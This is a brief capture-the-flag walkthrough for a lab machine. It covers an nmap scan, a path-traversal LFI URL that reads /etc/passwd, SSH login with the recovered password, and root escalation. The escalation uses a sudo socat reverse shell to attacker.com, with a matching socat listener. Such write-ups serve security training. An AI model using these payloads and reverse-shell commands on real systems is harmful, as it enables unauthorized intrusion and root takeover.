## scan

```
Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-30 05:45 EDT
Nmap scan report for 10.10.14.177
Host is up (0.35s latency).
Not shown: 769 closed ports, 229 filtered ports
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 8.03 seconds
```

browse to the webpage - click into posts

the url has a LFI vulnerability, we can replace the end with ../ to try and read the passwd file

```
http://10.10.14.177/article?name=lfiattack
```

to

```
http://10.10.14.177/article?name=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd
```

we read the password for falconfeast


## access

use the password for falconfeast to access ssh

read the user flag

## priv esc

copy linpeas.sh onto box and run

we find falconfeast can execute socat as root without a password

google socat priv esc

https://gtfobins.github.io/gtfobins/socat/

get a reverse shell with socat 

on attacker box, listen for reverse shell

```
socat file:`tty`,raw,echo=0 tcp-listen:12345
```

on falconfeast ssh

```
RHOST=attacker.com
RPORT=12345
sudo socat tcp-connect:$RHOST:$RPORT exec:/bin/sh,pty,stderr,setsid,sigint,sane
```

read the root flag.
